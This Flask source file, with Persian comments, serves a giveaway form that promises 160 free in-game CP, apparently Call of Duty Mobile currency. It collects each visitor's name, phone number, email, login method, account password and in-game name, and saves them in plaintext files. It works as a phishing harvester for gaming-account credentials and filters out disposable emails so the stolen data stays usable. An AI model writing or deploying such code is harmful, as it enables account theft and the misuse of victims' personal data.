from flask import Flask, render_template, request
import os
from datetime import datetime
from pathlib import Path
from werkzeug.utils import secure_filename
import re
from email_validator import validate_email, EmailNotValidError

app = Flask(__name__)

DATA_DIR = Path(app.root_path) / "data"
DATA_DIR.mkdir(parents=True, exist_ok=True)

# لیست دامنه‌های ایمیل موقت (disposable)
DISPOSABLE_EMAIL_DOMAINS = [
    "mailinator.com", "tempmail.com", "guerrillamail.com", "10minutemail.com", "maildrop.cc"
    # اضافه کردن دامنه‌های دیگر در صورت نیاز
]

# تابع برای اعتبارسنجی شماره تلفن
def validate_phone(phone):
    pattern = r"^(0901|0902|0903|0930|0933|0935|0936|0937|0938|0939|0910|0911|0912|0913|0914|0915|0916|0917|0918|0919|0990|0991|0992|0993)\d{7}$"
    return re.match(pattern, phone)

# تابع برای اعتبارسنجی ایمیل
def validate_email_address(email):
    try:
        # بررسی فرمت ایمیل
        validate_email(email)
        
        # بررسی دامنه ایمیل
        domain = email.split('@')[1]
        if domain in DISPOSABLE_EMAIL_DOMAINS:
            return False, "ایمیل وارد شده از نوع ایمیل موقت است. لطفاً ایمیل معتبر وارد کنید."
        
        return True, ""
    except EmailNotValidError:
        return False, "فرمت ایمیل وارد شده صحیح نیست."

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fullname = request.form.get('fullname', '').strip()
    phone = request.form.get('phone', '').strip()
    company = request.form.get('company', '').strip()
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()  # توصیه: رمزها را ذخیره نکن
    gamename = request.form.get('gamename', '').strip()

    # اعتبارسنجی نام و نام خانوادگی
    if len(fullname) < 7 or len(fullname) > 40:
        return render_template('index.html', message="نام و نام خانوادگی باید بین 7 تا 40 کاراکتر باشد.")

    # اعتبارسنجی شماره تلفن
    if not validate_phone(phone):
        return render_template('index.html', message="فرمت شماره تلفن صحیح نیست. لطفاً شماره تلفن معتبر وارد کنید.")

    # اعتبارسنجی ایمیل
    is_valid_email, email_message = validate_email_address(email)
    if not is_valid_email:
        return render_template('index.html', message=email_message)

    # ذخیره اطلاعات در فایل
    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    safe_email = secure_filename(email.replace('@', '_at_')) or "unknown"
    filename = f"{safe_email}_{timestamp}.txt"
    file_path = DATA_DIR / filename

    with file_path.open('w', encoding='utf-8') as f:
        f.write(f"نام کامل: {fullname}\n")
        f.write(f"شماره تلفن: {phone}\n")
        f.write(f"روش اتصال: {company}\n")
        f.write(f"ایمیل: {email}\n")
        f.write(f"رمز عبور: {password}\n")
        f.write(f"نام در بازی: {gamename}\n")

    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید. در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
